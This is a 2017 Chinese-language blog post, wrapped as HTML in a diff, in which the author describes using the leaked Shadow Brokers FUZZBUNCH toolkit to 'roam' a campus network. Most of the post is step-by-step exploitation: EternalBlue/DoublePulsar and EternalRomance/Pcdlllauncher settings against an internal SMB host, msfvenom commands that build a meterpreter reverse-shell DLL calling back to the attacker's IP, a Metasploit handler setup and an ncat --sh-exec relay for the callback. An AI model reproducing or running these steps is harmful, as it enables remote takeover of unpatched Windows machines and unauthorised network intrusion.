@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+  <meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'>
+<meta name='description' content='搞了两天，弄出个差不多的套路，漫游了一波校园网。
+环境要求： python2.6 &#43; pywin32 扩展包
+将 windows/lib/ 下对应的的dll目录添加到系统环境变量里面，还要把 pytrch.py 和 _pytrch 都放到python的扩展包里面，否则运行 fb.py 会报错。
+然后运行 fb.py
+两个可用套路：
+Eternalblue &#43; Doublepulsar use Eternalblue 中间按照提示填入相应的IP和端口信息 需要注意的是这里： [*] Mode :: Delivery mechanism *0) DANE Forward deployment via DARINGNEOPHYTE 1) FB Traditional deployment from within FUZZBUNCH [?] Mode [0] : 1 [&#43;] Run Mode: FB 然后一路确定就OK use Doublepulsar [!] Enter Prompt Mode :: Doublepulsar Module: Doublepulsar ==================== Name Value ---- ----- NetworkTimeout 60 TargetIp 10.'>
+
+<meta property='og:title' content='shadowbroker大杀器 • wrfly&#39;s blog'>
+<meta property='og:description' content='搞了两天，弄出个差不多的套路，漫游了一波校园网。
+环境要求： python2.6 &#43; pywin32 扩展包
+将 windows/lib/ 下对应的的dll目录添加到系统环境变量里面，还要把 pytrch.py 和 _pytrch 都放到python的扩展包里面，否则运行 fb.py 会报错。
+然后运行 fb.py
+两个可用套路：
+Eternalblue &#43; Doublepulsar use Eternalblue 中间按照提示填入相应的IP和端口信息 需要注意的是这里： [*] Mode :: Delivery mechanism *0) DANE Forward deployment via DARINGNEOPHYTE 1) FB Traditional deployment from within FUZZBUNCH [?] Mode [0] : 1 [&#43;] Run Mode: FB 然后一路确定就OK use Doublepulsar [!] Enter Prompt Mode :: Doublepulsar Module: Doublepulsar ==================== Name Value ---- ----- NetworkTimeout 60 TargetIp 10.'>
+<meta property='og:url' content='https://wrfly.kfd.me/posts/shadowbroker%E5%A4%A7%E6%9D%80%E5%99%A8/'>
+<meta property='og:site_name' content='wrfly&#39;s blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Posts'><meta property='article:tag' content='code'><meta property='article:published_time' content='2017-04-16T00:00:00Z'/><meta property='article:modified_time' content='2017-04-16T00:00:00Z'/><meta name='twitter:card' content='summary'>
+
+<meta name="generator" content="Hugo 0.31" />
+
+  <title>shadowbroker大杀器 • wrfly&#39;s blog</title>
+  <link rel='canonical' href='https://wrfly.kfd.me/posts/shadowbroker%E5%A4%A7%E6%9D%80%E5%99%A8/'>
+  
+  
+  <link rel='icon' href='/favicon.ico'>
+<link rel='stylesheet' href='/assets/css/main.c54db339.css'><link rel='stylesheet' href='/css/custom.css'>
+<script>
+window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+ga('create', 'UA-62244864-7', 'auto');
+ga('send', 'pageview');
+</script>
+<script async src='//www.google-analytics.com/analytics.js'></script>
+
+</head>
+
+
+<body class='page type-posts'>
+  <div class='site'>
+
+    <a class='screen-reader' href='#main'>Skip to Content</a>
+
+    <header id='header' class='header-container'>
+      <div class='header site-header'>
+        <nav id='main-menu' class='main-menu-container' aria-label='Main Menu'>
+  <ul class='main-menu'>
+  <li>
+      <a href='/'>Home</a>
+    </li>
+  <li>
+      <a href='/posts'>Posts</a>
+    </li>
+  <li>
+      <a href='/tags'>Tags</a>
+    </li>
+  <li>
+      <a href='/about'>About</a>
+    </li>
+  <li>
+      <a href='/links'>Links</a>
+    </li>
+  
+  </ul>
+</nav>
+
+        <div class='header-info'>
+          
+          <p class='site-title title'>wrfly&#39;s blog</p>
+          
+          <p class='site-description subtitle'>使生如夏花之绚烂，死如秋叶之静美</p>
+        </div>
+      </div>
+    </header>
+
+
+<main id='main' class='main'>
+  <article lang='en' class='entry'>
+    <header class='header-container'>
+  <div class='header entry-header'>
+    <div class='header-info'>
+      <h1 class='title'>shadowbroker大杀器</h1>
+      
+
+    </div>
+    
+<div class='meta'>
+  <span class='posted-on'><svg class='icon' viewbox='0 0 24 24' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' aria-hidden='true'>
+  
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"/>
+  <line x1="16" y1="2" x2="16" y2="6"/>
+  <line x1="8" y1="2" x2="8" y2="6"/>
+  <line x1="3" y1="10" x2="21" y2="10"/>
+  
+</svg>
+<span class='screen-reader'>Posted on </span>
+  <time class='date' datetime='2017-04-16T00:00:00Z'>2017, Apr 16</time>
+</span>
+
+  
+  
+
+</div>
+
+
+  </div>
+</header>
+
+    
+    
+
+    <div class='entry-content'>
+  
+
+<p>搞了两天，弄出个差不多的套路，漫游了一波校园网。</p>
+
+<p>环境要求： <code>python2.6</code> + <code>pywin32</code> 扩展包</p>
+
+<p>将 <code>windows/lib/</code> 下对应的的<code>dll</code>目录添加到系统环境变量里面，还要把 <code>pytrch.py</code> 和 <code>_pytrch</code> 都放到python的扩展包里面，否则运行 <code>fb.py</code> 会报错。</p>
+
+<p>然后运行 <code>fb.py</code></p>
+
+<p>两个可用套路：</p>
+
+<h3 id="eternalblue-doublepulsar">Eternalblue + Doublepulsar</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">use Eternalblue
+
+中间按照提示填入相应的IP和端口信息
+
+需要注意的是这里：
+[*]  Mode :: Delivery mechanism
+
+   *0) DANE     Forward deployment via DARINGNEOPHYTE
+    1) FB       Traditional deployment from within FUZZBUNCH
+
+[?] Mode [0] : 1
+[+] Run Mode: FB
+
+然后一路确定就OK
+
+use Doublepulsar
+
+[!] Enter Prompt Mode :: Doublepulsar
+
+Module: Doublepulsar
+====================
+
+Name                  Value
+----                  -----
+NetworkTimeout        60
+TargetIp              10.168.55.50
+TargetPort            445
+DllPayload            G:\go_64.dll
+DllOrdinal            1
+ProcessName           lsass.exe
+ProcessCommandLine
+Protocol              SMB
+Architecture          x64
+Function              RunDLL</pre></div>
+<p>这里记录一下这个 dll 是怎么生成的：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># target是32位系统
+</span><span style="color:#75715e"></span>msfvenom -p windows/meterpreter/reverse_tcp <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    LHOSTT<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>.170.4.114 <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">8888</span> <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    -f dll &gt; go.dll
+
+<span style="color:#75715e"># target是64位系统
+</span><span style="color:#75715e"></span>msfvenom -p windows/x64/meterpreter/reverse_tcp <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    LHOSTT<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>.170.4.114 <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">8888</span> <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    -f dll &gt; go.dll
+
+<span style="color:#75715e"># 其中 LHOST 和 LPORT 分别是target要连的机器的地址和端口
+</span><span style="color:#75715e"># msf set payload 的时候也要注意区分：
+</span><span style="color:#75715e"></span>msf &gt; use exploit/multi/handler 
+msf exploit<span style="color:#f92672">(</span>handler<span style="color:#f92672">)</span> &gt; set payload windows/meterpreter/reverse_tcp
+payload <span style="color:#f92672">=</span>&gt; windows/meterpreter/reverse_tcp
+msf exploit<span style="color:#f92672">(</span>handler<span style="color:#f92672">)</span> &gt; set LHOST <span style="color:#ae81ff">10</span>.170.4.114
+LHOST <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">10</span>.170.4.114
+msf exploit<span style="color:#f92672">(</span>handler<span style="color:#f92672">)</span> &gt; set LPORT <span style="color:#ae81ff">8888</span>
+LPORT <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">8888</span>
+
+<span style="color:#75715e"># 然后 run 就可以了
+</span><span style="color:#75715e"></span># 需要注意的是，要先run起来，然后在从 fb.py 这边 execute</code></pre></div>
+<h3 id="eternalromence-pcdlllauncher">Eternalromence + Pcdlllauncher</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">use Eternalromance
+
+...
+..
+.
+
+Module: Eternalromance
+<span style="color:#f92672">======================</span>
+
+Name                 Value
+----                 -----
+NetworkTimeout       <span style="color:#ae81ff">60</span>
+TargetIp             <span style="color:#ae81ff">10</span>.168.55.50
+TargetPort           <span style="color:#ae81ff">445</span>
+PipeName
+CallbackIp           <span style="color:#ae81ff">10</span>.170.4.114
+CallbackPort         <span style="color:#ae81ff">45213</span>
+CallbackLocalPort    <span style="color:#ae81ff">45213</span>
+ExploitMethod        Default
+Credentials          Anonymous
+Protocol             SMB
+Target               SERVER_2008R2_SP0
+Payload              Callback
+
+
+<span style="color:#75715e"># 出现的问题：
+</span><span style="color:#75715e"></span>
+<span style="color:#f92672">[</span>?<span style="color:#f92672">]</span> Execute Plugin? <span style="color:#f92672">[</span>Yes<span style="color:#f92672">]</span> :
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Executing Plugin
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running Exploit
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Initializing Parameters
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Error - Unsupported pipe name
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Error <span style="color:#ae81ff">45</span> <span style="color:#f92672">(</span>processParams<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Plugin failed
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Error: Eternalromance Failed
+fb Exploit <span style="color:#f92672">(</span>Eternalromance<span style="color:#f92672">)</span> &gt;
+
+<span style="color:#75715e"># 这个时候就要去找一个可用的pipename:
+</span><span style="color:#75715e"></span>
+fb Exploit <span style="color:#f92672">(</span>Eternalromance<span style="color:#f92672">)</span> &gt; use Namedpipetouch
+
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Entering Plugin Context :: Namedpipetouch
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Applying Global Variables
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Set NetworkTimeout <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">60</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Set TargetIp <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">10</span>.168.55.50
+
+fb Touch <span style="color:#f92672">(</span>Namedpipetouch<span style="color:#f92672">)</span> &gt; set
+
+Module: Namedpipetouch
+<span style="color:#f92672">======================</span>
+
+Name              Value
+----              -----
+NetworkTimeout    <span style="color:#ae81ff">60</span>
+TargetIp          <span style="color:#ae81ff">10</span>.168.55.50
+TargetPort        <span style="color:#ae81ff">445</span>
+Protocol          SMB
+
+fb Touch <span style="color:#f92672">(</span>Namedpipetouch<span style="color:#f92672">)</span> &gt; execute
+
+...
+...
+...
+
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Summary: <span style="color:#ae81ff">1</span> pipes found
+        OS Pipe: lsass rpc - <span style="color:#ae81ff">\P</span>IPE<span style="color:#ae81ff">\l</span>sarpc
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Namedpipetouch Succeeded
+
+<span style="color:#75715e"># 然后用这个pipe就可以了，或者重新启动一下 fb.py
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e"># 成功之后再使用 Pcdlllauncher
+</span><span style="color:#75715e"></span>
+use Pcdlllauncher
+
+Module: Pcdlllauncher
+<span style="color:#f92672">=====================</span>
+
+Name                    Value
+----                    -----
+ConnectedTcp
+XorMask                 <span style="color:#ae81ff">0</span>
+NetworkTimeout          <span style="color:#ae81ff">60</span>
+LPFilename              D:<span style="color:#ae81ff">\D</span>SZOpsDisk<span style="color:#ae81ff">\R</span>esources<span style="color:#ae81ff">\P</span>c<span style="color:#ae81ff">\L</span>egacy<span style="color:#ae81ff">\P</span>C_Exploit.dll
+LPEntryName             ServiceEntry
+ImplantFilename
+TargetOsArchitecture    x86
+PCBehavior              <span style="color:#ae81ff">8</span>
+
+<span style="color:#75715e"># LPFilename 搜一下PC_Exploit.dll的位置，填上
+</span><span style="color:#75715e"># ImplantFilename 就是上一个套路中的 go.dll or go_64.dll
+</span><span style="color:#75715e"></span># 配置好参数以后，从msf这边监听着。</code></pre></div>
+<h3 id="more">More</h3>
+
+<p>还有一件比较重要的事情，因为xp都是开在虚拟机里的，CallBack这里就需要一个端口转发，端口转发的方法有很多，推荐使用ncat：</p>
+
+<p><code>ncat --sh-exec &quot;ncat 192.168.56.102 45213&quot; -lkp 45213</code></p>
+
+<p>其中，<code>192.168.56.102</code>是虚拟机的IP</p>
+
+</div>
+
+    
+<footer class='entry-footer-container'>
+  <div class='entry-footer'>
+  <div class='tags'>
+  <span class='taxonomyTerm-icon'><svg class='icon' viewbox='0 0 24 24' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' aria-hidden='true'>
+  
+  <path d="M20.59,13.41l-7.17,7.17a2,2,0,0,1-2.83,0L2,12V2H12l8.59,8.59A2,2,0,0,1,20.59,13.41Z"/>
+  <line x1="7" y1="7" x2="7" y2="7"/>
+  
+</svg>
+</span>
+  <span class='screen-reader'>Tags: </span><a class='tag' href='/tags/code'>Code</a></div>
+
+  </div>
+</footer>
+
+
+  </article>
+  
+<nav class='entry-nav-container'>
+  <div class='entry-nav'><div class='prev-entry'>
+      <a href='/posts/%E8%BF%98%E6%98%AF%E4%BB%A3%E7%90%86/'>
+        <span aria-hidden='true'><svg class='icon' viewbox='0 0 24 24' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' aria-hidden='true'>
+  
+  <line x1="20" y1="12" x2="4" y2="12"/>
+  <polyline points="10 18 4 12 10 6"/>
+  
+</svg>
+ Previous</span>
+        <span class='screen-reader'>Previous post: </span>还是代理</a>
+    </div><div class='next-entry'>
+      <a href='/posts/%E6%A0%A1%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/'>
+        <span class='screen-reader'>Next post: </span>校内网安全测试<span aria-hidden='true'>Next <svg class='icon' viewbox='0 0 24 24' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' aria-hidden='true'>
+  
+  <line x1="4" y1="12" x2="20" y2="12"/>
+  <polyline points="14 6 20 12 14 18"/>
+  
+</svg>
+</span>
+      </a>
+    </div></div>
+</nav>
+
+  
+<div class='comments-container'>
+  <div id="disqus_thread"></div>
+<script>
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "wrfly" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+</main>
+
+    <footer id='footer' class='footer-container'>
+      <div class='footer'>
+        <div class='social-menu-container'>
+  <nav aria-label='Social Menu'>
+    <ul class='social-menu'><li>
+        <a href='https://github.com/wrfly' target='_blank' rel='noopener'>
+          <span class='screen-reader'>Open Github account in new tab</span><svg class='icon' viewbox='0 0 24 24' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' aria-hidden='true'>
+  
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/>
+  
+</svg>
+</a>
+      </li><li>
+        <a href='mailto:mr.wrfly@gmail.com' target='_blank' rel='noopener'>
+          <span class='screen-reader'>Contact via Email</span><svg class='icon' viewbox='0 0 24 24' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' aria-hidden='true'>
+  
+  <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/>
+  <polyline points="22,6 12,13 2,6"/>
+  
+</svg>
+</a>
+      </li><li>
+        <a href='https://t.me/wrfly' target='_blank' rel='noopener'>
+          <span class='screen-reader'>Open Telegram account in new tab</span><svg class='icon' viewbox='0 0 24 24' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' aria-hidden='true'>
+  
+  <path d="m 22.05,1.577 c -0.393,-0.016 -0.784,0.08 -1.117,0.235 -0.484,0.186 -4.92,1.902 -9.41,3.64 C 9.263,6.325 7.005,7.198 5.267,7.867 3.53,8.537 2.222,9.035 2.153,9.059 c -0.46,0.16 -1.082,0.362 -1.61,0.984 -0.79581202,1.058365 0.21077405,1.964825 1.004,2.499 1.76,0.564 3.58,1.102 5.087,1.608 0.556,1.96 1.09,3.927 1.618,5.89 0.174,0.394 0.553,0.54 0.944,0.544 l -0.002,0.02 c 0,0 0.307,0.03 0.606,-0.042 0.3,-0.07 0.677,-0.244 1.02,-0.565 0.377,-0.354 1.4,-1.36 1.98,-1.928 l 4.37,3.226 0.035,0.02 c 0,0 0.484,0.34 1.192,0.388 0.354,0.024 0.82,-0.044 1.22,-0.337 0.403,-0.294 0.67,-0.767 0.795,-1.307 0.374,-1.63 2.853,-13.427 3.276,-15.38 L 23.676,4.725 C 23.972,3.625 23.863,2.617 23.18,2.02 22.838,1.723 22.444,1.593 22.05,1.576 Z"/>
+  
+</svg>
+</a>
+      </li></ul>
+  </nav>
+</div>
+        <div class='copyright'>
+  <p>
+        
+          
+        
+      
+
+      Host with github | Build with Hugo | Theme by Minimo &copy; 2015-2017 wrfly 
+  </p>
+</div>
+
+      </div>
+    </footer>
+
+  </div><script src='/assets/js/main.5871befd.js'></script><script src='/js/custom.js'></script></body>
+
+</html>
+
